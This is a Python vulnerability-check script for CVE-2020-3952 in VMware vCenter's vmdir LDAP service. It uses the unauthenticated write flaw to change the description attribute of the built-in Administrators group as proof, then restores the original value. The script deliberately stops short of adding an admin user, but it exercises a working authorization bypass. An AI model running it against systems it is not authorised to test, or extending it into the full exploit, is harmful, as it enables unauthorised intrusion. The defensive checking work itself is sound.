#!/usr/bin/env python
#
# Code inspired from https://github.com/guardicore/vmware_vcenter_cve_2020_3952
# but instead of adding a user to the admin group, it will just add or update 
# the harmless 'description' attribute
#
# -- gelim

from random import randint
import ldap
import sys

if len(sys.argv) != 2:
    print('usage: exploit_check.py <vcenter_ip>')
    exit(1)

vcenter_ip = sys.argv[1]

group_name = 'cn=Administrators,cn=Builtin,dc=vsphere,dc=local'
attrib_name = 'description'
marker = 'CVE-2020-3952'.encode('UTF-8')

c = ldap.initialize('ldap://' + vcenter_ip)

#################
# BIND ATTEMPT  #
#################
# required for the exec path to hit the vulnerable code when doing privs ops later
try:
    c.simple_bind_s('Administrator@test.local', 'fakepassword')
except ldap.INVALID_CREDENTIALS:
    pass
except ldap.SERVER_DOWN:
    print('vmdir service not available. Not possible to check the vulnerability.')
    exit(0)
except:
    print('failed to bind with unexpected error')
    raise
else:
    print('did not receive ldap.INVALID_CREDENTIALS on bind! failing')
    exit(1)

#######################
# GROUP ATTRIB CHECK  #
#######################
# check if attribute is already existing
try:
    res = c.search_s(group_name, ldap.SCOPE_BASE, attrlist=[attrib_name])
    attrib_value_orig = res[0][1].get('description', [None])[0]
except ldap.NO_SUCH_OBJECT:
    pass
except:
    print('Issue while accessing builting Administrators group attributes.')
    print('[+] This server may NOT be vulnerable to CVE-2020-3952')
    exit(0)

if attrib_value_orig:
    print('Administrators group has already a \'%s\' attribute with value \'%s\'' % (attrib_name, attrib_value_orig))
    print('Attempting to append \'%s\' to it.' % marker)
else:
    print('No attribute \'%s\' found. Attempting to create it with value \'%s\'.' % (attrib_name, marker))

#################
# GROUP MOD ADD #
#################
# add attribute with value or append to existing one

if attrib_value_orig:
    attrib_value = "%s %s" % (attrib_value_orig, marker)
    op = ldap.MOD_REPLACE
else:
    attrib_value = marker
    op = ldap.MOD_ADD
    
group_mod_l = [(op, attrib_name, [attrib_value])]

try:
    c.modify_s(group_name, group_mod_l)
except ldap.TYPE_OR_VALUE_EXISTS:
    print('Attribute already exists')
except:
    print('Attribute adding issue. The vCenter may not be vulnerable to CVE-2020-3952')
    raise

######################
# GROUP ATTRIB CHECK #
######################
# (double) check attribute is present with a search
res = c.search_s(group_name, ldap.SCOPE_BASE, attrlist=[attrib_name])
attrib_value_new = res[0][1].get('description', [None])[0]
if attrib_value_new == attrib_value:
    print('[+] vCenter server \'%s\' is VULNERABLE to CVE-2020-3952. Check https://www.vmware.com/security/advisories/VMSA-2020-0006.html' % vcenter_ip)

####################
# GROUP MOD DELETE #
####################
# cleanup phase: delete or restore old value

if attrib_value_orig:
    group_mod_l = [(ldap.MOD_REPLACE, attrib_name, [attrib_value_orig])]
else:
    group_mod_l = [(ldap.MOD_DELETE, attrib_name, None)]
c.modify_s(group_name, group_mod_l)


